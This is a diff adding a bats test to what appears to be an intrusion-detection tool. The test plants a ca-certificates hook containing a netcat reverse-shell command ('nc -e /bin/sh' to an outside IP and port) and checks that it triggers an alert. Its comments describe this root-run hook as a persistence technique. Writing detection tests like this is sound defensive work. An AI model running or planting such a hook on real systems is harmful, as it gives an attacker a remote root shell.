@@ -236,3 +236,18 @@ seed_benign() {
     run_wd
     cap | grep -q '"severity":"alert"'
 }
+
+@test "INVARIANT (nc reverse-shell variant in ca-certificates hook: netcat-listening pipe also detected — sister axis to /dev/tcp)" {
+    # Sister to sshrc/csh-config/logrotate/systemd-power-hooks/
+    # dhclient-hooks/bash-completion/anacrontab/apt-hooks/boot-script
+    # nc reverse-shell variant INVARIANTs across the brain. Lock the
+    # netcat axis on trust-store-rebuild-triggered root-exec
+    # persistence surface (T1546 — update-ca-certificates runs hook
+    # scripts AS ROOT on every routine CA maintenance).
+    seed_benign
+    run_wd
+    : > "${SELFDEF_TEST_LOGCAP}"
+    printf '#!/bin/sh\nnc -e /bin/sh 1.1.1.1 4444\n' > "${HOOKD}/jks-keystore"
+    run_wd
+    cap | grep -qE '"severity":"(alert|warn)"'
+}
